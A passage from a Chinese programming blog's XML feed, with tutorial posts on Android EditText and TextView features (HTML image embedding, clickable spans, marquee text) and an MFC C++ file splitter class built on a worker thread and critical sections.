class="tag">    <span class="attr">android:inputType</span>=<span class="string">"number"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>android:digits=&quot;abc&quot;</code>这个的意思就是说我们只能输入abc，<code>android:inputType=&quot;number&quot;</code>这个的意思就是说我们只能输入数字。<br><img src="img2.jpg" alt="只能输入数字"><br>校验：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CharSequence t = Et_1.getText().toString();</span><br><span class="line"><span class="keyword">if</span>(TextUtils.isEmpty(t))</span><br><span class="line">&#123;</span><br><span class="line">	Et_1.setError(<span class="string">"你怎么写了个空啊"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="img3.jpg" alt="错误提示"></p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>TextView more fun</title>
    <url>/2020/02/04/TextView-more-fun/</url>
    <content><![CDATA[<h2 id="图文混排"><a href="#图文混排" class="headerlink" title="图文混排"></a>图文混排</h2><p>其实也就是HTML的操作，只不过有一点比较特殊，就是在使用img标签的时候我们需要提供一个接口对象，用来提供我们的图片资源ID，如果资源ID非常非常的多，我们用大量的if语句是非常的麻烦的，而且后期维护性非常的差，所以我们就用到反射的帮助，首先我们构建一个获取资源ID的函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getDrawableResureID</span><span class="params">(String imageName)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalArgumentException, IllegalAccessException</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Field field = R.drawable<span class="class">.<span class="keyword">class</span>.<span class="title">getField</span>(<span class="title">imageName</span>)</span>;</span><br><span class="line">			<span class="keyword">return</span> Integer.parseInt(field.get(<span class="keyword">null</span>).toString());</span><br><span class="line">		&#125; <span class="keyword">catch</span> (NoSuchFieldError e) &#123;</span><br><span class="line">			<span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数其实就是说提供一个String类型的值，我们通过反射获取类中对应的资源ID。</p>
<p>既然可以这样我们就可以写代码实现img标签的功能了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Tv_One = (TextView) findViewById(R.id.Tv_One);</span><br><span class="line">		String text1 = <span class="string">"&lt;font color = 'blue'&gt;Hello Wker&lt;/font&gt;&lt;img src='ic_l1'/&gt;"</span>;</span><br><span class="line">		text1 += <span class="string">"&lt;font color = 'blue'&gt;Hello Wker1&lt;/font&gt;&lt;img src='ic_l2'/&gt;"</span>;</span><br><span class="line">		text1 += <span class="string">"&lt;font color = 'blue'&gt;Hello Wker2&lt;/font&gt;&lt;img src='ic_l3'/&gt;"</span>;</span><br><span class="line">		CharSequence text =  Html.fromHtml(text1, <span class="keyword">new</span> ImageGetter() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> Drawable <span class="title">getDrawable</span><span class="params">(String source)</span> </span>&#123;</span><br><span class="line">				<span class="comment">//根据资源ID获取图片</span></span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					Drawable drawable = getResources().getDrawable(getDrawableResureID(source));</span><br><span class="line">					drawable.setBounds(<span class="number">0</span>, <span class="number">0</span>, drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight());</span><br><span class="line">					<span class="keyword">return</span> drawable;</span><br><span class="line">				&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">					<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">					e.printStackTrace();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;, <span class="keyword">null</span>);</span><br><span class="line">		Tv_One.setText(text);</span><br></pre></td></tr></table></figure>
<p>我们先配置一下HTML标签，居住我们的src要和我们文件的名称一样，因为我们是反射来获取的，R文件的资源就是这样的，获取滞后我们用fromHTML获取CharSequence对象，记得我们用Drawable的时候我哦们还需要设置Drawable的边界，否则会出错，我们可以调节Drawable的宽高实现缩放。<br><img src="img1.jpg" alt="图文混排"><br><img src="img2.jpg" alt="资源名称"></p>
<h2 id="文本跳转"><a href="#文本跳转" class="headerlink" title="文本跳转"></a>文本跳转</h2><p>这个就是不需要HTML的标签我们自己写这个跳转，其实也不是跳转了，就是一个段文本的点击事件：<br>代码片段如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String text = <span class="string">"OK点我打开"</span>;</span><br><span class="line">SpannableString span = <span class="keyword">new</span> SpannableString(text);</span><br><span class="line">span.setSpan(<span class="keyword">new</span> ClickableSpan() &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View widget)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		Intent in = <span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>,jmp_class<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">		startActivity(in);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;, <span class="number">2</span>,text.length(),Spanned.SPAN_EXCLUSIVE_EXCLUSIVE );<span class="comment">//SPAN_EXCLUSIVE_EXCLUSIVE这个是不包含前后</span></span><br><span class="line">Tv_One.setText(span);</span><br><span class="line">Tv_One.setMovementMethod(LinkMovementMethod.getInstance());<span class="comment">//响应点击</span></span><br></pre></td></tr></table></figure>
<p>首先先是new一个<code>SpannableString</code>的对象，这个对象的构造方法就是一个文本，然后<code>setSapn</code>方法的第一个参数就是一个点击的对象，这个对象其实中的<code>onClick</code>方法就是当点击指定文本的时候我们响应的时间，这里我们是打开一个Activity，第二三个参数是起始位置和结束为止，在设置文本，然后在确定有响应点击。<br><img src="img3.jpg" alt="实现效果"></p>
<h2 id="跑马灯效果"><a href="#跑马灯效果" class="headerlink" title="跑马灯效果"></a>跑马灯效果</h2><p>其实跑马灯这个效果就是之前写Win32说的那种KTV效果，就是一些字符在这跑动，在安卓中是比较简单的，首先我们添加一个TextView，如下配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/textView1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:singleLine</span>=<span class="string">"True"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:ellipsize</span>=<span class="string">"marquee"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:focusable</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:focusableInTouchMode</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"啊啊165461654986啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><code>android:singleLine=&quot;True&quot;</code>这个第意思是说TextView是单行的</li>
<li><code>android:ellipsize=&quot;marquee&quot;</code>这个说名他是滚动的，可以设置为前面或者后面啥的三个点</li>
<li><code>android:focusable=&quot;true&quot;</code>这个说明是可以获取焦点的，想一下其实TextView就是一个静态文本，Windows下这个东西是不能获得焦点的。</li>
<li><code>android:focusableInTouchMode=&quot;true&quot;</code>这个说是支持触摸获得焦点的。</li>
</ol>
<p>效果点开就是发现他是跑马灯效果。但是我们知道，只要焦点一消失，我们就不会动了，比如说EditText输入东西我们就不能获取了，那么我们之后自己写一个TextView来让我们的焦点一直存在。</p>
<p>增加两个组件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">com.example.android_stduy1.MyTextView</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">"@+id/textView2"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:singleLine</span>=<span class="string">"True"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:ellipsize</span>=<span class="string">"marquee"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">"啊啊165461654986啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊"</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个EditText是用来让第一个失去焦点的，下面这个由于我们是强制拥有假的焦点，那么第三四个就不要了，这个时候我们添加一个类：”MyTextView.java”，这个我们自己写一个TextView。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.android_stduy1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.util.AttributeSet;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTextView</span> <span class="keyword">extends</span> <span class="title">TextView</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MyTextView</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(context);</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MyTextView</span><span class="params">(Context context, AttributeSet attrs)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(context, attrs);</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MyTextView</span><span class="params">(Context context, AttributeSet attrs, <span class="keyword">int</span> defStyle)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(context, attrs, defStyle);</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isFocused</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重写这个类的时候有一点非常注意，我就在这里踩坑了，就是我们的构造函数要写三个，原因具体不清楚，可能是都有可能调用的原因吧，然后我们重写<code>isFocused</code>方法，让他一直都以为有焦点。这个样子我们就可以了，看下效果：<br><img src="img4.gif" alt="实现效果"></p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>文件切割系统</title>
    <url>/2020/02/03/%E6%96%87%E4%BB%B6%E5%88%87%E5%89%B2%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h1 id="文件切割系统"><a href="#文件切割系统" class="headerlink" title="文件切割系统"></a>文件切割系统</h1><p>通过这个程序的编写，是一个提升，这段代码提现了明显的Windows程序编写的优点，程序的编写我是参考书籍，虽然书籍有部分出错，但是大体的思想还是非常好的。</p>
<h2 id="程序思想"><a href="#程序思想" class="headerlink" title="程序思想"></a>程序思想</h2><p>首先我们需要了解文件分割合并工具的一个操作流程，分割文件与合并文件其实就是对文件的一个操作（读取创建写入），我们完全可以通过MFC给我们的CFile类。<br>程序流程：我们选择分割单选框的时候，我们供用户一个文件打开通用对话框，我们选择合并单选框的时候我们提供用户一个文件夹选择对话框，让给用户选择一个文件夹，然后合并里面的一些固定文件名称的文件（1__文件.*）。</p>
<p>看下程序操作的一些截图：<br><img src="img1.jpg" alt="选择程序"><br><img src="img2.jpg" alt="分割的文件"><br><img src="img3.jpg" alt="程序运行成功"></p>
<p>这个是简单的分割，其实原理不是太难，而且也是有一定的缺陷，但还是一个很典型的Win32程序。</p>
<p>首先我们需要构造我们这个程序的编写思路，首先我们需要我们之前写好的那个CDirDialog类，传送门：<a href="https://wker666.github.io/2020/01/19/%E9%80%9A%E7%94%A8%E5%AF%B9%E8%AF%9D%E6%A1%86/" target="_blank" rel="noopener" title="通用对话框">https://wker666.github.io/2020/01/19/%E9%80%9A%E7%94%A8%E5%AF%B9%E8%AF%9D%E6%A1%86/</a><br>导入这个类之后，但是直接导入到MFC中是不行的，你会发现重定义，需要将我们的那个头文件和源文件分开写。<br>为了我们后期开发的一个可维护性很高的程序话呢，我感觉适当的“高内聚低耦合”是一个比较重要的一点，所以我们将我们的文件分割操作写到一个类中，正式这个类，完美的提现了Win32编程的巧妙与灵活性。</p>
<h2 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h2><p>首先我们重要的CFileCutter类是需要提供一个完整的流程，就是从构造函数一被执行我们就需要开启一个线程，这个线程是类中的一个函数，但是类函数是不能作为线程函数的，这个时候就想到了一个很聪明的做法，那就是类的友元函数，虽然函数的格式固定了，但是友元函数的格式不是固定的，开启线程之后，我们设置一个事件对象，这个事件对象是用来控制线程是否继续的，还有有一点很重要就是我们需要一个关键代码段的对象，因为我们可能在多个地方调用成员变量，所以这个东西也是很关键的一点，并且我们使用<code>PostMessage</code>的方式进行传输我们的消息，这样使我们的接受信息变得不需要有回调函数，程序变得方便了许多。</p>
<h2 id="头文件定义"><a href="#头文件定义" class="headerlink" title="头文件定义"></a>头文件定义</h2><p><code>CFileCutter.h</code>头文件的定义</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __FILECUTTER_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __FILECUTTER_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WM_CUTTERSTART WM_USER+100   <span class="comment">//wParam = nTotalCount</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WM_CUTTERSTOP WM_USER+101    <span class="comment">//wParam = nExitCode ,lParam = nCompletedCount</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WM_CUTTERSTATUS WM_USER+102  <span class="comment">//lParam = nCompletedCount</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CFileCutter</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">enum</span> ExitCode</span><br><span class="line">	&#123;</span><br><span class="line">		exitSuccess,</span><br><span class="line">		exitUserForce,</span><br><span class="line">		exitSourceErr,</span><br><span class="line">		exitDestErr</span><br><span class="line">	&#125;;</span><br><span class="line">	CFileCutter(HWND hWndNotify);</span><br><span class="line">	<span class="function">BOOL <span class="title">StartSplit</span><span class="params">(LPCTSTR lpszDestDir,LPCTSTR lpszSourceFile,UINT nFileSize)</span></span>;</span><br><span class="line">	<span class="function">BOOL <span class="title">StartMerge</span><span class="params">(LPCTSTR lpszDestDir,LPCTSTR lpszSourceFile)</span></span>;</span><br><span class="line">	<span class="function">BOOL <span class="title">SuspendCutter</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">BOOL <span class="title">ResumeCutter</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">StopCutter</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">BOOL <span class="title">IsRunning</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> m_bRunning;&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	~CFileCutter();</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">Reset</span><span class="params">()</span></span>;<span class="comment">//重置参数信息和状态标志</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">DoSplit</span><span class="params">()</span></span>;<span class="comment">//真正的分割</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">DoMerge</span><span class="params">()</span></span>;<span class="comment">//真正的合并</span></span><br><span class="line">	UINT <span class="keyword">friend</span> _CutterEntry(LPVOID lpParam);<span class="comment">//工作线程</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//参数信息</span></span><br><span class="line">	CString m_strSource;</span><br><span class="line">	CString m_strDest;</span><br><span class="line">	UINT m_uFileSize;</span><br><span class="line">	BOOL m_bSplit;</span><br><span class="line">	<span class="comment">//状态信息</span></span><br><span class="line">	BOOL m_bContinue;</span><br><span class="line">	BOOL m_bRunning;</span><br><span class="line"></span><br><span class="line">	CRITICAL_SECTION m_cs;<span class="comment">//临界区的的一个参定值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	HWND m_hWndNotify;<span class="comment">//接受信息的窗口句柄</span></span><br><span class="line">	HANDLE m_hWorkEvent;<span class="comment">//通知信息的事件对象句柄</span></span><br><span class="line">	CWinThread * m_pThread;<span class="comment">//工作线程</span></span><br><span class="line">	BOOL m_bSuspend;<span class="comment">//暂停标志</span></span><br><span class="line">	BOOL m_bExitThread;<span class="comment">//退出标志</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span><span class="comment">//__FILECUTTER_H__</span></span></span><br></pre></td></tr></table></figure>
<p>为了防止重定义我们的类，我们需要使用到一些预编译指令。</p>
<ol>
<li>四个参数信息，分别是：源文件，目标文件，是否是分割，每个分割文件的大小</li>
<li>两个状态信息：是否继续，是否在运行</li>
<li>一个参定值：关键代码段</li>
<li>五个受保护的值：窗口句柄（用来接收消息投递的），事件对象，工作线程的一个句柄，是否暂停，是否停止</li>
<li>一个枚举类型：包含了当前状态信息（操作成功，用户强行停止，源文件错误，目标文件错误）</li>
<li>两个真正的操作函数</li>
<li>一个友元线程</li>
<li>一个重置状态信息的函数，用来清空我们的一些操作信息。</li>
<li>两个间接启动的操作线程</li>
<li>三个线程操作函数，分别是暂停，恢复，停止</li>
<li>一个检验是不是在运行的函数</li>
</ol>
<p>看完这些之后，我们对我们的类函数有了一定的了解之后我们就要来编写成员函数了。</p>
<h2 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h2><p>首先我们需要包含我们的头文件：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CFileCutter.h"</span></span></span><br></pre></td></tr></table></figure>
<p><code>stdafx.h</code>这个头文件是要包含的，因为MFC的东西都在里面。<br><code>_CutterEntry</code>这个使我们的线程函数，里面主要是控制着是否分割合并文件的，控制端就是我们的事件对象。具体实现如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">UINT _CutterEntry(LPVOID lParam)</span><br><span class="line">&#123;</span><br><span class="line">	CFileCutter * pCutter = (CFileCutter *)lParam;</span><br><span class="line">	<span class="keyword">while</span>(WaitForSingleObject(pCutter-&gt;m_hWorkEvent,INFINITE) == WAIT_OBJECT_0 &amp;&amp; !pCutter-&gt;m_bExitThread)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//设置状态标志</span></span><br><span class="line">		EnterCriticalSection(&amp;(pCutter-&gt;m_cs));</span><br><span class="line">		pCutter-&gt;m_bRunning = TRUE;</span><br><span class="line">		LeaveCriticalSection(&amp;(pCutter-&gt;m_cs));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(pCutter-&gt;m_bSplit)</span><br><span class="line">			pCutter-&gt;DoSplit();</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			pCutter-&gt;DoMerge();</span><br><span class="line">		pCutter-&gt;Reset();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们接受我们传过来的文件切割对象，强制转换一下，然后用<code>WaitForSingleObject</code>等待我们的事件对象响应，无线等待，并且我们的退出为假。当我们满足了这些要求之后，我们先进入临界区对象，将我们的正在运行设置为真，然后离开（这个真是太仔细了），然后判断是切割还是合并。</p>
<p>然后我们要完成的是构造函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CFileCutter::CFileCutter(HWND hWndNotify)</span><br><span class="line">&#123;</span><br><span class="line">	m_hWndNotify = hWndNotify;</span><br><span class="line">	m_bExitThread = FALSE;</span><br><span class="line">	m_bSuspend  = FALSE;</span><br><span class="line">	m_hWorkEvent = CreateEvent(<span class="literal">NULL</span>,FALSE,FALSE,<span class="literal">NULL</span>);</span><br><span class="line">	m_pThread = ::AfxBeginThread(_CutterEntry,<span class="keyword">this</span>,THREAD_PRIORITY_NORMAL,<span class="number">0</span>,CREATE_SUSPENDED,<span class="literal">NULL</span>);</span><br><span class="line">	m_pThread-&gt;m_bAutoDelete = FALSE;</span><br><span class="line">	m_pThread-&gt;ResumeThread();</span><br><span class="line">	InitializeCriticalSection(&amp;m_cs);</span><br><span class="line">	Reset();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个构造函数是用来初始化我们我们状态信息和启动我们的线程，初始化关键代码段对象的。并且我们需要接受我传递过来的窗口句柄，并重新设置一些信息。<br>然后我们要看我们的<code>Reset()</code>这个可能常用，主要是用来刷新我们参数信息的。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CFileCutter::Reset()</span><br><span class="line">&#123;</span><br><span class="line">	EnterCriticalSection(&amp;m_cs);</span><br><span class="line">	m_strSource.Empty();</span><br><span class="line">	m_strDest.Empty();</span><br><span class="line">	m_uFileSize = <span class="number">0</span>;</span><br><span class="line">	m_bSplit = TRUE;</span><br><span class="line">	<span class="comment">//重置状态</span></span><br><span class="line">	m_bContinue = TRUE;</span><br><span class="line">	m_bRunning = FALSE;</span><br><span class="line">	LeaveCriticalSection(&amp;m_cs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重置一些信息，注意还是要进入关键代码段与离开。</p>
<p>在我们的析构函数中，我们需要清空信息，通知活动线程我们结束了，并且删除我们创建的这些对象。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CFileCutter::~CFileCutter()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//设置结束标志</span></span><br><span class="line">	m_bExitThread = TRUE;</span><br><span class="line">	EnterCriticalSection(&amp;m_cs);</span><br><span class="line">	m_bContinue = FALSE;</span><br><span class="line">	LeaveCriticalSection(&amp;m_cs);</span><br><span class="line">	SetEvent(m_hWorkEvent);<span class="comment">//防止限制线程等待m_hWorkEvent</span></span><br><span class="line">	WaitForSingleObject(m_pThread-&gt;m_hThread,INFINITE);<span class="comment">//保证线程已经完毕</span></span><br><span class="line">	CloseHandle(m_hWorkEvent);</span><br><span class="line">	DeleteCriticalSection(&amp;m_cs);</span><br><span class="line">	<span class="keyword">delete</span> m_pThread;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先还是先进入关键代码段，设置我们不运行了，要退出，然后告诉我们的线程函数，别等了，我们要结束了，然后等待线程的完毕，关闭事件对象，删除关键代码段，删除线程。</p>
<p>间接切割合并文件的实现：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">BOOL CFileCutter::StartSplit(LPCTSTR lpszDestDir,LPCTSTR lpszSourceFile,UINT nFileSize)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(m_bRunning)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	EnterCriticalSection(&amp;m_cs);</span><br><span class="line">	m_strSource = lpszSourceFile;</span><br><span class="line">	m_strDest = lpszDestDir;</span><br><span class="line">	m_uFileSize = nFileSize;</span><br><span class="line">	m_bSplit = TRUE;</span><br><span class="line">	LeaveCriticalSection(&amp;m_cs);</span><br><span class="line">	SetEvent(m_hWorkEvent);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">BOOL CFileCutter::StartMerge(LPCTSTR lpszDestDir,LPCTSTR lpszSourceFile)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(m_bRunning)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	EnterCriticalSection(&amp;m_cs);</span><br><span class="line">	m_strSource = lpszSourceFile;</span><br><span class="line">	m_strDest = lpszDestDir;</span><br><span class="line">	m_bSplit = FALSE;</span><br><span class="line">	LeaveCriticalSection(&amp;m_cs);</span><br><span class="line">	SetEvent(m_hWorkEvent);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就是先判断是不是在运行，然后进关键代码段，然后设置一些信息，然后通知线程该工作了。</p>
<p>再接下来就是我们的一些暂停恢复结束操作了：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">BOOL CFileCutter::SuspendCutter()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(m_bRunning)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	<span class="keyword">if</span>(!m_bSuspend)</span><br><span class="line">	&#123;</span><br><span class="line">		m_pThread-&gt;SuspendThread();</span><br><span class="line">		m_bSuspend = TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">BOOL CFileCutter::ResumeCutter()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(m_bRunning)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	<span class="keyword">if</span>(!m_bSuspend)</span><br><span class="line">	&#123;</span><br><span class="line">		m_pThread-&gt;ResumeThread();</span><br><span class="line">		m_bSuspend = FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> CFileCutter::StopCutter()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//设置强制退出标志</span></span><br><span class="line">	EnterCriticalSection(&amp;m_cs);</span><br><span class="line">	m_bContinue = FALSE;</span><br><span class="line">	LeaveCriticalSection(&amp;m_cs);</span><br><span class="line">	ResumeCutter();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>暂停的话呢先判断是不是在运行，然后调用线程的暂停方法，设置成员变量，恢复也是。停止的话呢就是直接将继续这个变量给结束，然后恢复线程。</p>
<p>下面这个是核心代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CFileCutter::DoSplit()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> nCompleted = <span class="number">0</span>;</span><br><span class="line">	CString strSourceFile = m_strSource;</span><br><span class="line">	CString strDestDir = m_strDest;</span><br><span class="line">	CFile sourceFile,destFile;</span><br><span class="line">	<span class="keyword">if</span> (!sourceFile.Open(strSourceFile,CFile::modeRead | CFile::shareDenyWrite | CFile::typeBinary))<span class="comment">//shareDenyWrite打开文件的时候禁止其他程序进行读写</span></span><br><span class="line">	&#123;</span><br><span class="line">		PostMessage(m_hWndNotify,WM_CUTTERSTOP,exitSourceErr,nCompleted);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//确保目录的存在，逐级创建文件目录</span></span><br><span class="line">	<span class="keyword">int</span> nPos = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">while</span> ((nPos = strDestDir.Find(<span class="string">"\\"</span>,nPos+<span class="number">1</span>)) != <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		CString str = strDestDir.Left(nPos+<span class="number">1</span>);</span><br><span class="line">		CreateDirectory(str,<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	CreateDirectory(strDestDir,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(strDestDir.Right(<span class="number">1</span>) != <span class="string">"\\"</span>)</span><br><span class="line">		strDestDir += <span 